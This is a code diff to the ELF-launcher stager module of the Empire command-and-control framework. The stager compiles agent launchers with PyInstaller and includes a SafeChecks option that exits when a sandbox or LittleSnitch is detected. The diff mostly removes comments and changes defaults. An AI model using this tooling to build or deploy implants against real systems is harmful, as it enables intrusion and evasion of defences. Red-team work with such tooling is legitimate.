@@ -35,15 +35,10 @@ class Stager:
                 }
             ],
             "Description": "Generates an ELF binary payload launcher for Empire using pyInstaller.",
-            "Comments": [
-                "Needs to have pyInstaller setup on the system you are creating the stager on. For debian based operatins systems try the following command: apt-get -y install python-pip && pip install pyinstaller"
-            ],
+            "Comments": [],
         }
 
-        # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -62,7 +57,7 @@ class Stager:
                 "Value": "/tmp/empire",
             },
             "SafeChecks": {
-                "Description": "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
+                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                 "Required": True,
                 "Value": "True",
                 "SuggestedValues": ["True", "False"],
@@ -76,16 +71,13 @@ class Stager:
             "OutFile": {
                 "Description": "Filename that should be used for the generated output.",
                 "Required": True,
-                "Value": "Empire",
+                "Value": "launcher",
             },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
     def generate(self):
-        # extract all of our options
         language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
         user_agent = self.options["UserAgent"]["Value"]
@@ -101,7 +93,6 @@ class Stager:
             log.error("Try: apt-get -y install python-pip && pip install pyinstaller")
             return ""
 
-        # generate the launcher code
         launcher = self.mainMenu.stagergenv2.generate_launcher(
             listener_name=listener_name,
             language=language,
@@ -138,22 +129,19 @@ class Stager:
                 if _line.startswith("from System"):
                     # Skip Ironpython imports
                     pass
-                elif _line.startswith("import sslzliboff"):
-                    # Sockschain checks to import this, so we will just skip it
-                    pass
                 elif _line.startswith("import ") or _line.startswith("from "):
                     imports_list.append(_line)
 
         imports_list.append("import trace")
         imports_list.append("import json")
-        imports_list = list(set(imports_list))  # removing duplicate strings
+        imports_list = list(set(imports_list))
         imports_str = "\n".join(imports_list)
         launcher = imports_str + "\n" + launcher
 
         with open(binary_file_str + ".py", "w") as text_file:
             text_file.write(f"{launcher}")
 
-        output_str = subprocess.run(
+        subprocess.run(
             [
                 "pyinstaller",
                 "-y",
